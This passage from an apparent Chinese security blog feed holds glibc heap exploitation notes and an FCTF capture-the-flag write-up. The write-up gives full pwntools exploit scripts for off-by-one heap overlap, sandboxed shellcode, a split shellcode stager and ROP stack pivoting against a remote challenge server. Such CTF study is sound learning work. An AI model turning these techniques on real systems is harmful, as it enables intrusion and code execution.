NON_MAIN_ARENA);</span><br><span class="line">              _int_free (av, old_top, 1);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>另一种是会先把原来的 top chunk free 进 unsorted bin。但是要满足几个条件：</p><p>1、(unsigned long) (old_size) &gt;= MINSIZE</p><p>2、 prev_inuse (old_top) = 1</p><p>3、 ((unsigned long) old_end &amp; (pagesize - 1)) == 0)</p><p>所以我们通过溢出把 top chunk 的 size 改小即可，并且注意内存页对齐。</p><h2 id="0x10常规泄露"><a href="#0x10常规泄露" class="headerlink" title="0x10常规泄露"></a>0x10常规泄露</h2><p>当程序有输出chunk内容的功能时,通过将chunk挂载入unsortedbin再取出,即可在mem区域写上libc地址(主要是利用bk字段),之后泄露</p><p>挂载两个不合并的chunk进入unosortedbin再取出,即可同时泄露libc地址和堆地址</p><h2 id="0x11tcache相关"><a href="#0x11tcache相关" class="headerlink" title="0x11tcache相关"></a>0x11tcache相关</h2><p><strong>tcache:0x20-0x410</strong></p><p>在2.32以前,直接将hook等地址挂入tcache取出,需要注意count[tc_idx]的值足够</p><p>tcache几乎不合并因此overlap之类要避开tcache</p><h2 id="0x12overlap"><a href="#0x12overlap" class="headerlink" title="0x12overlap"></a>0x12overlap</h2><p>overlap分为两种</p><p><strong>向前overlap</strong>:</p><p><strong>其一:</strong></p><p>主要是修改prev_inuse位使得free时与前面的chunk合并,</p><p>要记得绕过unlink等检查</p><p><strong>其二:</strong></p><p>假设有A,B两个chunk相邻排列,</p><p>并没有主动修改B的prev_inuse,而是释放掉A,使B的prev_inuse正常变为0,</p><p>之后在off-by-null之类修改掉A的size,使得A再取出来分配时set_inuse无法找到正确的位置使得B的prev_inuse依然保持为0</p><p>之后再释放B,触发overlap</p><p>也要绕过unlink等检查</p><p><strong>向后overlap:</strong></p><p>直接修改chunk的size字段,向后覆盖其他chunk</p><p>也要绕过一些检查,像!prev_inuse(nextchunk)</p><h2 id="0x13在tcahe-perthread-struct上伪造chunk"><a href="#0x13在tcahe-perthread-struct上伪造chunk" class="headerlink" title="0x13在tcahe_perthread_struct上伪造chunk"></a>0x13在tcahe_perthread_struct上伪造chunk</h2><p>在2.26版本之后堆上会有一个tcahe_perthread_struct</p><p>用于存放tcache的信息:数量和链头</p><p>因为内存存储的特性</p><p>可以利用其伪造chunk</p><ul><li>用count的组合来伪造chunk,主要是0x3a0和0x3b0这两个大小的</li><li>用0x21和0x31这两个chunk伪造fd和bk</li></ul><h2 id="0x14-unsortedbin头"><a href="#0x14-unsortedbin头" class="headerlink" title="0x14 unsortedbin头"></a>0x14 unsortedbin头</h2><p>常见版本中</p><p>以2.27为分界线,之前unsortedbin的头是main_arena+88,2.27及之后是main_arena+96</p><p>原因是2.27及之后malloc_state多了一个<code>int have_fastchunks;</code>变量</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
            <tag> 实操 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FCTF</title>
      <link href="/posts/21638/"/>
      <url>/posts/21638/</url>
      
        <content type="html"><![CDATA[<h1 id="FCTF"><a href="#FCTF" class="headerlink" title="FCTF"></a>FCTF</h1><h2 id="题录"><a href="#题录" class="headerlink" title="题录"></a>题录</h2><h3 id="Pwn-warmup-1"><a href="#Pwn-warmup-1" class="headerlink" title="Pwn warmup 1"></a>Pwn warmup 1</h3><p>保护全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;/glibc/glibc-2.31/build/lib&#x27;</span><br></pre></td></tr></table></figure><p>附件有给源代码,粗读一遍判定为菜单类堆题</p><p>程序开头会直接给出flag的地址</p><p>考虑如何利用,细读源码发现edit函数存在off-by-one漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">note_t</span> *note = get_note();</span><br><span class="line">  <span class="keyword">if</span> (!note) &#123; <span class="built_in">puts</span>(<span class="string">&quot;Not found&quot;</span>); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="type">int</span> len = <span class="built_in">strlen</span>(note-&gt;content);  </span><br><span class="line">  printff(<span class="string">&quot;New content: &quot;</span>);</span><br><span class="line">  read_str(note-&gt;content, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strlen函数到\x00结束,如果某个chunk能占用下一个chunk的prev_size则能覆盖下一个chunk的size</p><p>可以用这个漏洞来达到chunk extended and overlapping的目的</p><p>再看add函数,进行add函数时</p><ol><li>首先创建一个chunk用于一个该note信息管理</li><li>再创建一个用户自定义大小的chunk用于存储内容</li></ol><p>这两个chunk是黏在一起的</p><p>于是,我们可以这样利用</p><p>创建3个note</p><ol><li>note0用于触发off-by-one</li><li>note1用于释放重分配以达到chunk extended and overlapping</li><li>note2用于触发show功能读取flag</li></ol><p>具体步骤</p><p>我创建的三个note的content大小都为24且初始填满(1和2填不填无所谓),方便利用</p><ol><li>edit修改note0,使note1的size为一个能够覆盖到note2的content指针的大小</li><li>释放note1</li><li>再add一个note,content大小为能使分配到的chunk为之前释放的note1的content,并填充内容覆盖note2的content指针</li><li>对note2进行show,得到flag</li></ol><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">a=p.recv()[<span class="number">0</span>:<span class="number">15</span>]</span><br><span class="line">e=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"><span class="comment">#第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第2个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#修改第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x61&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#释放第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#再分配一个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;80&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>+p64(e))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>以上是我第一次做的思路,这样做的话对note1的content大小没有什么要求</p><p>后面我发现其实只要两个note也能实现得到flag</p><p>不过对note1的content大小有严格要求</p><p>因为如果note1的content实际chunk大小为0x20的话</p><p>再分配note1的时候,note1头的chunk因为大小合适,直接取的之前被释放的note1的content的chunk</p><p>又因为之前的chunk overlapping</p><p>所以note1的content就包含了note1的头,可以直接修改note1的content指针</p><p>再show-note1得到flag</p><p>顺便尝试了下函数写法</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">a=p.recv()[<span class="number">0</span>:<span class="number">15</span>]</span><br><span class="line">e=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(size))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第0个note</span></span><br><span class="line">add(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment">#第1个note</span></span><br><span class="line">add(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment">#修改第0个note</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line"><span class="comment">#释放第1个note</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#再分配一个note</span></span><br><span class="line">add(<span class="number">48</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(e))</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" blue><summary> 实操调试的一些小细节 </summary>              <div class='content'>              <p>主要还是一些关于stdin的细节，当程序读取n个字节时，可以发送多余n的字节，程序读取完后，剩余的数据依然会被保留在stdin中，相邻的输入函数又会直接读取其中的数据，而这可能并不是我们所期望的，这样如果<strong>没有注意把控字节数</strong>的话，调试的时候可能出一些问题，例如菜单式题目直接从stdin中读取一个数据，读到了非菜单区号数据,那么程序的运行就会受阻;又或者程序读取的数据,并没有包含整个我们需要的数据,又会出现问题</p><p>总之需要注意发送的数据与接收的数据数量对应关系,特别要注意\n符</p>              </div>            </details><h3 id="shellcode1"><a href="#shellcode1" class="headerlink" title="shellcode1"></a>shellcode1</h3><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/aichch/pwn/s1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida打开,程序执行并不复杂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fwrite(<span class="string">&quot;Input your shellcode:\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x16</span>uLL, _bss_start);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)buf) &lt;= <span class="number">5</span> )</span><br><span class="line">&#123;</span><br><span class="line">  sandbox();</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  fwrite(<span class="string">&quot;Oops! maybe too long!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x16</span>uLL, _bss_start);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过再payload前添加’\x00’绕过strlen的检测,但单独一个<strong>‘\x00’会使得程序流停滞</strong>,故可以让’\x00’和push联合作为一条指令—-push 0h(\x6a00)</p><p>另外程序开启了沙盒,只能使用orw操作</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&#x27;./s1&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">2225</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)  <span class="comment">#不进行这一步会出错,因为默认是32位</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sh=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">sh+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">sh+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">sh=asm(sh)</span><br><span class="line">p.send(<span class="string">b&#x27;\x6a\x00&#x27;</span>+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另外提一下,程序进行时stdin,stdout,stderr三个文件流是自行打开的,文件描述符分别是0,1,2</p><p>故之后打开的文件的描述符是从3开始的</p><h3 id="shellcode2"><a href="#shellcode2" class="headerlink" title="shellcode2"></a>shellcode2</h3><p>这题没做出来,汇编忘得差不多了,还是太依赖ida的反汇编了😥</p><p>赛后看大佬的wp才恍然大悟</p><hr><p>这题在于程序一次只能执行四个字节长度的代码,故如果要连接各串代码还需要用到jmp指令,又占去了一半的长度,</p><p>再加上程序还会随机打乱代码顺序</p><p>想直接完成orw几乎不可能</p><p>但可以观察到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000016DA 48 8B 45 F0                   mov     rax, [rbp+var_10]</span><br><span class="line">.text:00000000000016DE 48 83 C0 10                   add     rax, 10h</span><br><span class="line">.text:00000000000016E2 48 89 C2                      mov     rdx, rax</span><br><span class="line">.text:00000000000016E5 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000016EA FF D2                         call    rdx</span><br></pre></td></tr></table></figure><p>程序是通过rdx跳往代码执行处的</p><p>那么第一次只需要向rdx处写命令,并在前面填充一些nop,程序流继续往下执行就会执行新写的命令了</p><p>那么第一次执行的代码因该就要是read(0,rdx,rdx),长度不用指定只要够大就行</p><p>因为syscall要在最后执行,所以只有四分之一的成功率</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./sc2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.12.48.154&quot;</span>, <span class="number">2226</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">next_slot = <span class="string">&#x27;;jmp $+30&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_slot</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">return</span> code + next_slot</span><br><span class="line"></span><br><span class="line">preamble = []</span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;xor edi, edi&#x27;</span>))  <span class="comment">#不能是rdi,汇编代码三个字节</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;xor eax, eax&#x27;</span>)) <span class="comment">#同上</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;push rdx;pop rsi&#x27;</span>)) <span class="comment">#mov rsi,rdx是三个字节长度</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    movabs rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mov rax, 0x2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, rax     </span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;want?\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.send(asm(preamble[i]))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x100</span> + asm(sc))</span><br><span class="line"><span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;Fire!\n&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure><p>因为open函数执行后,文件描述符存储在rax,所以直接rax赋值给rdi就行了</p><h3 id="Play-with-rop"><a href="#Play-with-rop" class="headerlink" title="Play-with-rop"></a>Play-with-rop</h3><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>存在溢出但只能控制rbp和rip,故需要先进行栈迁移</p><p>第一次通过再调用一次main中的read往迁移后的rbp-0x30写来进一步获得栈迁移的能力</p><p>之后栈迁移后利用puts函数将broken_keys打印出来,在跳转到wonderland获得加密后的flag</p><p>这题不算很难,但做的时候栈迁移的位置不好,被printf的栈越界卡住了</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./chall&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;1.12.48.154&quot;</span>, <span class="number">2224</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_rsi_rdx = <span class="number">0x4012A9</span></span><br><span class="line"></span><br><span class="line">key0_addr = <span class="number">0x4040B0</span></span><br><span class="line">key1_addr = key0_addr + <span class="number">0x8</span></span><br><span class="line">key2_addr = key1_addr + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">lea_ret = <span class="number">0x04016B4</span></span><br><span class="line">read_again = <span class="number">0x401686</span>   <span class="comment">#这个read是往rbp-0x30写</span></span><br><span class="line">wonderland = <span class="number">0x4012D6</span></span><br><span class="line"></span><br><span class="line">fake_rbp = <span class="number">0x404600</span> + <span class="number">0x880</span> <span class="comment"># +0x880 to ensure fake stack is large enough for puts</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span> + p64(fake_rbp) + p64(read_again)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;leave your name&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi_rsi_rdx) + p64(<span class="number">0</span>) + p64(fake_rbp-<span class="number">0x30</span>) + p64(<span class="number">0x100</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(fake_rbp-<span class="number">0x38</span>) + p64(lea_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_rsi_rdx) + p64(key0_addr) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(puts) + p64(pop_rdi_rsi_rdx) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(wonderland)</span><br><span class="line">p.send(payload3)</span><br><span class="line">data = p.recvuntil(<span class="string">b&#x27;flag:&#x27;</span>)</span><br><span class="line">keys = data[<span class="number">77</span>:<span class="number">77</span>+<span class="number">24</span>] <span class="comment"># 77是通过计算字符数得到的,不晓得为什么先接收77个字节再改动keys不能成功</span></span><br><span class="line">k0 = u64(keys[:<span class="number">8</span>])</span><br><span class="line">k1 = u64(keys[<span class="number">8</span>:<span class="number">16</span>]) ^ k0</span><br><span class="line">k2 = u64(keys[<span class="number">16</span>:<span class="number">24</span>]) ^ k1</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(k0), <span class="built_in">hex</span>(k1), <span class="built_in">hex</span>(k2))</span><br><span class="line"></span><br><span class="line">flag = p.recv().strip()</span><br><span class="line">real_flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">real_flag += (u64(flag[:<span class="number">8</span>])    ^ k0).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">8</span>:<span class="number">16</span>])  ^ k1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">16</span>:<span class="number">24</span>]) ^ k2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">24</span>:<span class="number">32</span>]) ^ k0).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">32</span>:<span class="number">40</span>]) ^ k1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">40</span>:<span class="number">48</span>]) ^ k2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span 